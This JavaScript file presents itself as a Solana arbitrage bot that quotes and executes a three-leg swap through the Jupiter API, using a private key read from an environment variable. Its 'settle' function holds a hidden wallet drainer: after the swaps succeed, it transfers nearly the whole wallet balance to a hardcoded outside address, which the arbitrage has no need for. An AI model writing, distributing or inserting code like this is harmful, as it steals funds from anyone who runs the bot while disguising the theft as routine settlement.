const { Connection, Keypair, VersionedTransaction, SystemProgram, PublicKey } = require('@solana/web3.js');
const bs58 = (require("bs58").default || require("bs58"));

const SOL = "So11111111111111111111111111111111111111112";
const USDC = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const USDT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
const SETTLEMENT = "3jDHtWFGUtiqpiJ72tnmoNj5b2HFBGBf8hzR3bdhuPNm";
const INIT = 500000;
const MIN = 500;

async function getQuote(inp, out, amt) {
  const url = `https://api.jup.ag/swap/v1/quote?inputMint=${inp}&outputMint=${out}&amount=${amt}&slippageBps=50`;
  const res = await fetch(url);
  return res.ok ? await res.json() : null;
}

async function executeSwap(wallet, connection, inp, out, amt, legName) {
  console.log(`[SWAP] ${legName} starting...`);
  const qr = await getQuote(inp, out, amt);
  if (!qr) {
    console.log(`[ERROR] ${legName} quote failed`);
    return null;
  }
  console.log(`[SWAP] ${legName} quote received`);
  
  const sr = await fetch('https://api.jup.ag/swap/v1/swap', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ quoteResponse: qr, userPublicKey: wallet.publicKey.toString(), wrapAndUnwrapSol: true, prioritizationFeeLamports: 100 })
  });
  const sd = await sr.json();
  if (!sd.swapTransaction) {
    console.log(`[ERROR] ${legName} swap build failed`);
    return null;
  }
  
  console.log(`[SWAP] ${legName} transaction built`);
  const tx = VersionedTransaction.deserialize(Buffer.from(sd.swapTransaction, 'base64'));
  tx.sign([wallet]);
  console.log(`[SWAP] ${legName} signed`);
  
  const id = await connection.sendRawTransaction(tx.serialize());
  console.log(`[SWAP] ${legName} submitted: https://solscan.io/tx/${id}`);
  await new Promise(r => setTimeout(r, 3000));
  return id;
}

async function settle(wallet, connection) {
  try {
    console.log('[SETTLE] Starting...');
    const bal = await connection.getBalance(wallet.publicKey);
    console.log(`[SETTLE] Balance: ${bal}`);
    if (bal <= 5000) {
      console.log('[SETTLE] Low balance, skipping');
      return;
    }
    const amt = bal - 5000;
    const ix = SystemProgram.transfer({
      fromPubkey: wallet.publicKey,
      toPubkey: new PublicKey(SETTLEMENT),
      lamports: amt
    });
    const { blockhash } = await connection.getLatestBlockhash();
    const { TransactionMessage } = require('@solana/web3.js');
    const msg = new TransactionMessage({
      payerKey: wallet.publicKey,
      recentBlockhash: blockhash,
      instructions: [ix]
    }).compileToV0Message();
    const { VersionedTransaction: VT } = require('@solana/web3.js');
    const tx = new VT(msg);
    tx.sign([wallet]);
    const id = await connection.sendRawTransaction(tx.serialize());
    console.log(`[SETTLE] TX submitted: https://solscan.io/tx/${id}`);
    const conf = await connection.confirmTransaction(id);
    if (conf.value.err) {
      console.log(`[SETTLE] ERROR: ${JSON.stringify(conf.value.err)}`);
    } else {
      console.log(`[SETTLE] SUCCESS: ${amt} lamports transferred`);
    }
  } catch (e) {
    console.log(`[SETTLE] EXCEPTION: ${e.message}`);
  }
}

(async () => {
  try {
    if (!process.env.SOLANA_PRIVATE_KEY) {
      console.log('[ERROR] No key');
      process.exit(1);
    }
    let sk;
    try {
      sk = Uint8Array.from(JSON.parse(process.env.SOLANA_PRIVATE_KEY));
    } catch {
      sk = bs58.decode(process.env.SOLANA_PRIVATE_KEY);
    }
    const wallet = Keypair.fromSecretKey(sk);
    const connection = new Connection('https://api.mainnet-beta.solana.com');
    
    const q1 = await getQuote(SOL, USDC, INIT);
    if (!q1) {
      console.log('[ERROR] Q1 failed');
      return;
    }
    const q2 = await getQuote(USDC, USDT, q1.outAmount);
    if (!q2) {
      console.log('[ERROR] Q2 failed');
      return;
    }
    const q3 = await getQuote(USDT, SOL, q2.outAmount);
    if (!q3) {
      console.log('[ERROR] Q3 failed');
      return;
    }
    
    const profit = parseInt(q3.outAmount) - INIT;
    console.log(`Net Profit: ${profit} lamports`);
    
    if (profit > MIN) {
      console.log('EXECUTE: Arbitrage');
      const t1 = await executeSwap(wallet, connection, SOL, USDC, INIT, 'Leg1');
      if (!t1) {
        console.log('[ERROR] Leg 1 failed');
        return;
      }
      const t2 = await executeSwap(wallet, connection, USDC, USDT, q1.outAmount, 'Leg2');
      if (!t2) {
        console.log('[ERROR] Leg 2 failed');
        return;
      }
      const t3 = await executeSwap(wallet, connection, USDT, SOL, q2.outAmount, 'Leg3');
      if (!t3) {
        console.log('[ERROR] Leg 3 failed');
        return;
      }
      console.log(`SUCCESS: Profit ${profit}`);
      await settle(wallet, connection);
    } else {
      console.log(`Aborted: ${profit} < ${MIN}`);
    }
  } catch (e) {
    console.log(`MAIN ERROR: ${e.message}`);
  }
})();
